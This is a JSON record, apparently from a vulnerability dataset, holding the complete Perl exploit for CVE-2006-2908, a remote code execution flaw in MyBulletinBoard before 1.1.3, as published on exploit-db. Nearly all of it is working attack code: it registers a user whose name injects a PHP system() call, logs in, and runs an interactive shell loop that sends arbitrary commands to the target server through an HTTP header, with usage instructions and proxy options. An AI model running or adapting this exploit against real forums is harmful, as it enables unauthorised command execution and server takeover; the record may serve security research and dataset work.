{
  "id": "1909",
  "title": "MyBulletinBoard (MyBB) &lt; 1.1.3 - Remote Code Execution",
  "cve": "CVE-2006-2908",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl \r\n# Tue Jun 13 12:37:12 CEST 2006 jolascoaga@514.es\r\n#\r\n# Exploit HOWTO - read this before flood my Inbox you bitch!\r\n#\r\n# - First you need to create the special user to do this use:\r\n#\t./mybibi.pl --host=http://www.example.com --dir=/mybb -1\r\n#   this step needs a graphic confirmation so the exploit writes a file \r\n#   in /tmp/file.png, you need to\r\n#   see this img and put the text into the prompt. If everything is ok, \r\n#   you'll have a new valid user created.\r\n# * There is a file mybibi_out.html where the exploit writes the output \r\n#   for debugging.\r\n# - After you have created the exploit or if you have a valid non common \r\n#   user, you can execute shell commands.\r\n#\r\n# TIPS:\r\n# \t* Sometimes you have to change the thread Id, --tid is your friend ;)\r\n#\t* Don't forget to change the email. You MUST activate the account.\r\n#\t* Mejor karate aun dentro ti.\r\n#\r\n# LIMITATIONS:\r\n#\t* If the admin have the username lenght < 28 this exploit doesn't works\r\n#\r\n# Greetz to !dSR ppl and unsec\r\n#\r\n# 514 still r0xing!\r\n\r\n# user config.\r\nmy $uservar = \"C\"; # don't use large vars.\r\nmy $password = \"514r0x\";\r\nmy $email = \"514\\@mailinator.com\";\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\nuse LWP::Simple;\r\nuse HTTP::Request::Common \"POST\";\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\n$| = 1;   # you can choose this or another one.\r\n\r\nmy ($proxy,$proxy_user,$proxy_pass, $username);\r\nmy ($host,$debug,$dir, $command, $del, $first_time, $tid);\r\nmy ($logged, $tid) = (0, 2);\r\n\r\n$username = \"'.system(getenv(HTTP_\".$uservar.\")).'\";\r\n\r\nmy $options = GetOptions (\r\n  'host=s'\t      => \\$host, \r\n  'dir=s'\t      => \\$dir,\r\n  'proxy=s'           => \\$proxy,\r\n  'proxy_user=s'      => \\$proxy_user,\r\n  'proxy_pass=s'      => \\$proxy_pass,\r\n  'debug'             => \\$debug,\r\n  '1'\t\t      => \\$first_time,\r\n  'tid=s'\t      => \\$tid,\r\n  'delete'\t      => \\$del);\r\n\r\n&help unless ($host); # please don't try this at home.\r\n\r\n$dir = \"/\" unless($dir);\r\nprint \"$host - $dir\\n\";\r\nif ($host !~ /^http/) {\r\n\t$host = \"http://\".$host;\r\n}\r\n\r\nLWP::Debug::level('+') if $debug;\r\nmy ($res, $req);\r\n\r\nmy $ua = new LWP::UserAgent(\r\n           cookie_jar=> { file => \"$$.cookie\" });\r\n$ua->agent(\"Mothilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!\");\r\n$ua->proxy(['http'] => $proxy) if $proxy;\r\n$req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;\r\n\r\ncreate_user() if $first_time;\r\n\r\nwhile () {\r\n\t\tlogin() if !$logged;\r\n\r\n\t\tprint \"mybibi> \"; # lost connection\r\n\t\twhile(<STDIN>) {\r\n\t\t\t\t$command=$_;\r\n\t\t\t\tchomp($command);\r\n\t\t\t\tlast;\r\n\t\t}\r\n\t\t&send($command);\r\n}\r\n\r\nsub send  {\r\n\tchomp (my $cmd = shift);\r\n\tmy $h = $host.$dir.\"/newthread.php\";\r\n\tmy $req = POST $h, [\r\n\t\t'subject' => '514',\r\n\t\t'message' => '/slap 514',\r\n\t\t'previewpost' => 'Preview Post',\r\n\t\t'action' => 'do_newthread',\r\n\t\t'fid' => $tid,\r\n\t\t'posthash' => 'e0561b22fe5fdf3526eabdbddb221caa'\r\n\t];\r\n\t$req->header($uservar => $cmd);\r\n\tprint $req->as_string() if $debug;\r\n\tmy $res = $ua->request($req);\r\n\tif ($res->content =~ /You may not post in this/) {\r\n\t\tprint \"[!] don't have perms to post. Change the Forum ID\\n\";\r\n\t} else {\r\n\t\tmy ($data) = $res->content =~ m/(.*?)\\<\\!DOCT/is;\r\n\t\tprint $data;\r\n\t}\r\n\r\n}\r\nsub login {\r\n\tmy $h  = $host.$dir.\"/member.php\";\r\n\tmy $req = POST $h,[\r\n\t\t'username' => $username,\r\n\t\t'password' => $password,\r\n\t\t'submit' => 'Login',\r\n\t\t'action' => 'do_login'\r\n\t];\r\n\tmy $res = $ua->request($req);\r\n\tif ($res->content =~ /You have successfully been logged/is) {\r\n\t\tprint \"[*] Login succesful!\\n\";\r\n\t\t$logged = 1;\r\n\t} else {\r\n\t\tprint \"[!] Error login-in\\n\";\r\n\t}\r\n}\r\n\r\nsub help {\r\n    print \"Syntax: ./$0 --host=url --dir=/mybb [options] -1 --tid=2\\n\";\r\n    print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n    print \"\\t--debug\\n\";\r\n    print \"the default directory is /\\n\";\r\n    print \"\\nExample\\n\";\r\n    print \"bash# $0 --host=http(s)://www.server.com/\\n\";\r\n    print \"\\n\";\r\n    exit(1);\r\n}\r\n\r\nsub create_user {\r\n\t# firs we need to get the img.\r\n\tmy  $h = $host.$dir.\"/member.php\";\r\n\tprint \"Host: $h\\n\";\r\n\r\n\t$req = HTTP::Request->new (GET => $h.\"?action=register\");\r\n\t$res = $ua->request ($req);\r\n\r\n\tmy $req = POST $h, [\r\n\t\t'action' => \"register\",\r\n\t\t'agree' => \"I Agree\"\r\n\t];\r\n\tprint $req->as_string() if $debug;\r\n\t$res = $ua->request($req);\r\n\r\n\tmy $content = $res->content();\r\n\t$content =~ m/.*(image\\.php\\?action.*?)\\\".*/is;\r\n\tmy $img = $1;\r\n\tmy $req = HTTP::Request->new (GET => $host.$dir.\"/\".$img);\r\n\t$res = $ua->request ($req);\r\n\tprint $req->as_string();\r\n\r\n\tif ($res->content) {\r\n\t\topen (TMP, \">/tmp/file.png\") or die($!);\r\n\t\tprint TMP $res->content;\r\n\t\tclose (TMP);\r\n\t\tprint \"[*] /tmp/file.png created.\\n\";\r\n\t}\r\n\r\n\tmy ($hash) = $img =~ m/hash=(.*?)$/;\r\n\tmy $img_str = get_img_str();\r\n\tunlink (\"/tmp/file.png\");\r\n\t$img_str =~ s/\\n//g;\r\n\tmy $req = POST $h, [\r\n\t\t'username' => $username,\r\n\t\t'password' => $password,\r\n\t\t'password2' => $password,\r\n\t\t'email' => $email,\r\n\t\t'email2' => $email,\r\n\t\t'imagestring' => $img_str,\r\n\t\t'imagehash' => $hash,\r\n\t\t'allownotices' => 'yes',\r\n\t\t'receivepms' => 'yes',\r\n\t\t'pmpopup' => 'no',\r\n\t\t'action' => \"do_register\",\r\n\t\t'regsubmit' => \"Submit Registration\"\r\n\t];\r\n\t$res = $ua->request($req);\r\n\tprint $req->as_string() if $debug;\r\n\r\n\topen (OUT, \">mybibi_out.html\");\r\n\tprint OUT $res->content;\r\n\r\n\tprint \"Check $email for confirmation or mybibi_out.html if there are some error\\n\";\r\n}\r\n\r\nsub get_img_str ()\r\n{\r\n\tprint \"\\nNow I need the text shown in /tmp/file.png: \";\r\n\tmy $str = <STDIN>;\r\n\treturn $str;\r\n}\r\nexit 0;\r\n\r\n# milw0rm.com [2006-06-13]",
  "url": "https://www.exploit-db.com/exploits/1909"
}